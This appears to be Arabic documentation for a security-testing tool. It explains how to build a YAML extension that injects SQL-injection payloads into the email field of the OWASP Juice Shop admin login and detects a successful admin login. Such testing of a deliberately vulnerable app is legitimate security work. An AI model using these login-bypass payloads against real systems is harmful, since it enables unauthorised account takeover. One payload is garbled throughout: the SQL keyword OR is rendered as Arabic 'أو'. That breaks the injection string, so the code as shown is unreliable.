[link-app-examination]:     app-examination.md
[link-points]:              ../points/intro.md
[link-using-extension]:     ../using-extension.md
[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section

[doc-collect-phase]:        ../phase-collect.md
[doc-match-phase]:          ../phase-match.md
[doc-modify-phase]:         ../phase-modify.md
[doc-generate-phase]:       ../phase-generate.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project


#   إنشاء امتداد التعديل

سيقوم الامتداد الوارد في هذا الوثيقة بتعديل طلب أساس وارد لحقن بعض البيانات فيه. قد تؤدي هذه البيانات إلى استغلال ضعف SQLi في نموذج تسجيل الدخول بتطبيق [“OWASP Juice Shop”][link-juice-shop] المستهدف.
  
##  التحضيرات

نوصي بشدة باتباع هذه الخطوات قبل إنشاء امتداد FAST:
1.  [استقصاء سلوك التطبيق المستهدف][link-app-examination] الذي تنشئ الامتداد من أجله.
2.  [قراءة مبادئ بناء النقاط لامتداد][link-points].


##  بناء الامتداد

أنشئ ملفًا يصف الامتداد (مثل، `mod-extension.yaml`) واملأه بالأقسام المطلوبة:

1.  [**قسم `meta-info`**][link-meta-info].

    قم بإعداد وصف الضعف الذي سيحاول الامتداد اكتشافه.
    
    * عنوان الضعف: `OWASP Juice Shop SQLi (mod extension)`
    * وصف الضعف: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * نوع الضعف: إس كيو إل إنجكشن
    * مستوى تهديد الضعف: عالي
    
    يجب أن يظهر قسم `meta-info` على النحو التالي:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **قسم `collect`، مرحلة [الجمع][doc-collect-phase]**.
    
    يتم استدعاء واجهة برمجة تطبيقات REST  `POST /rest/user/login` عند محاولة تسجيل الدخول.
    
    لا حاجة لإنشاء طلبات اختبار لكل طلب أساسي لتسجيل الدخول تم إرساله إلى الواجهة البرمجية حيث سيتم إجراء الاختبار لاكتشاف الضعف بنفس الطريقة لكل قطعة من البيانات المرسلة في الطلب POST.
    
    قم بإعداد الامتداد بحيث يتم تنفيذه مرة واحدة عندما تتلقى الواجهة البرمجية الطلب لتسجيل الدخول. للقيام بذلك، أضف مرحلة الجمع مع شرط الفريد إلى الامتداد.

    يتكون الطلب `/rest/user/login` إلى الواجهة البرمجية لتسجيل الدخول من:

    1.  الجزء الأول من المسار بقيمة `rest`،
    2.  الجزء الثاني من المسار بقيمة `user`، و
    3.  طريقة العمل `login`
    
    النقاط المقابلة التي تشير إلى هذه القيم هي التالية:

    1.  `PATH_0_value` للجزء الأول من المسار
    2.  `PATH_1_value` للجزء الثاني من المسار
    3.  `ACTION_NAME_value` لطريقة العمل `login`
    
    إذا أضفت الشرط الذي يجب أن يكون تركيب هذه الثلاثة عناصر فريدًا، فإن الامتداد سيعمل فقط لأول طلب أساسي `/rest/user/login` إلى الواجهة البرمجية (سيُعامل هذا الطلب على أنه فريد، وجميع الطلبات اللاحقة إلى الواجهة البرمجية لتسجيل الدخول لن تكون فريدة).
    
    أضف قسم `collect` المقابل إلى ملف YAML للامتداد.
    
    ```
    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]
    ```

3.  **قسم `match`، مرحلة [المطابقة][doc-match-phase]**.
    
    من الضروري التحقق مما إذا كان الطلب الأساسي الوارد هو حقًا الطلب إلى الواجهة البرمجية لتسجيل الدخول، لأن الامتداد الذي نقوم بإنشائه سيستغل الضعف الذي يحتويه نموذج تسجيل الدخول.
    
    قم بإعداد الامتداد بحيث يعمل فقط إذا كان الطلب الأساسي موجهًا إلى الرابط التالي: `/rest/user/login`. أضف مرحلة المطابقة التي تتحقق مما إذا كان الطلب المستلم يحتوي على العناصر المطلوبة. يمكن القيام بذلك باستخدام قسم `match` التالي:

    ```
    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'
    ```

4.  **قسم `modify`، مرحلة [التعديل][doc-modify-phase]**.
    
    لنفترض أنه من الضروري تعديل الطلب الأساسي لتحقيق الأهداف التالية:
    * إفراغ قيمة رأس HTTP `Accept-Language` (هذه القيمة غير مطلوبة لاكتشاف الضعف).
    * استبدال القيم الحقيقية للمعلمات `email` و `password` بقيم `dummy` محايدة.
    
    أضف إلى الامتداد قسم `modify` التالي الذي يعدل الطلب لتحقيق الأهداف المذكورة أعلاه:
    
    ```
    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"
    ```
    
    !!! info "صيغة وصف عناصر الطلب"
        نظرًا لأن البيانات المطلوبة الموجودة بتنسيق JSON مخزنة في أزواج `<key: value>`، فإن النقطة التي تشير إلى قيمة عنصر `email` ستظهر كما هو موضح أعلاه. النقطة التي تشير إلى قيمة عنصر `password` لها بنية مماثلة.
        
        لرؤية معلومات مفصلة حول بناء النقاط، انتقل إلى هذا [الرابط][link-points].
 
5.  **قسم `generate`، مرحلة [التوليد][doc-generate-phase]**.

    من المعروف أن هناك حملتين يجب استبدال قيمة المعلم `email` في الطلب الأساسي بهما لاستغلال ضعف الإس كيو إل إنجكشن في التطبيق المستهدف:
    * `'أو 1=1 --`
    * `admin@juice-sh.op'--`
        
    !!! info "إدخال البيانات في الطلب المعدل"
        سيتم إدخال البيانات في الطلب المعدل مسبقًا، لأن الامتداد يحتوي على قسم `modify`. وبالتالي، بعد إدخال الحملة الأولى في حقل `email`، يجب أن تظهر بيانات الطلب الاختباري كما يلي:
    
        ```
        {
            "email": "'أو 1=1 --",
            "password":"dummy"
        }
        ```
    
        نظرًا لأنه يمكن استخدام أي كلمة مرور لتسجيل الدخول بنجاح بسبب الحملات المختارة، لا يُعتبر ضروريًا إدخال البيانات في حقل كلمة المرور، والذي سيكون له قيمة `dummy` بعد تطبيق مرحلة التعديل.
    
        أضف قسم `generate` الذي سيقوم بإنشاء طلبات الاختبار التي تلبي المتطلبات المناقشة أعلاه.
    
        ```
        generate:
          - payload:
            - "'أو 1=1 --"
            - "admin@juice-sh.op'--"
          - into: "POST_JSON_DOC_HASH_email_value"
          - method:
            - replace
        ```

6.  **قسم `detect`، مرحلة [الكشف][doc-detect-phase]**.
    
    الشروط التالية تدل على أن المصادقة على المستخدم بحقوق المدير كانت ناجحة:
    * وجود معلم تعريف عربة التسوق بقيمة `1` في جسم الاستجابة. المعلم بتنسيق JSON ويجب أن يظهر بالطريقة التالية:
    
        ```
        "bid":1
        ```
    
    * وجود معلم البريد الإلكتروني للمستخدم بقيمة `admin@juice-sh.op` في جسم الاستجابة. المعلم بتنسيق JSON ويجب أن يظهر بالطريقة التالية:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    أضف قسم `detect` الذي يتحقق مما إذا كان الهجوم ناجحًا وفقًا للشروط المذكورة أعلاه.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "التخلص من الرموز الخاصة"
    تذكر التخلص من الرموز الخاصة في السلاسل.

##  ملف الامتداد

الآن يحتوي ملف `mod-extension.yaml` على المجموعة الكاملة من الأقسام المطلوبة لعمل الامتداد. إليك قائمة بمحتويات الملف:

??? info "mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]

    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'

    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"

    generate:
      - payload:
        - "'أو 1=1 --"
        - "admin@juice-sh.op'--"
      - into: "POST_JSON_DOC_HASH_email_value"
      - method:
        - replace

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  استخدام الامتداد

للحصول على معلومات مفصلة حول كيفية استخدام الامتداد المُنشأ، اقرأ [هذا الوثيقة][link-using-extension].